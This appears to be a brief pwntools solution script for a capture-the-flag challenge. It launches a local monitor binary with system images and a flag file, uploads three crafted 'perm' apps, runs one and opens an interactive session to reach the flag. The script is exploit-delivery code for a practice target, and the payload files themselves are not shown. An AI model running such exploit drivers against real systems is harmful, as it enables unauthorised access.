from pwn import *

r = process(['./mon', './init.sys', './loader.sys', './echo.sys',
    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp'])

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

download('perm.uapp')
download('perm.papp')
download('perm.sapp')
r.sendline('run perm.sapp')

r.interactive()
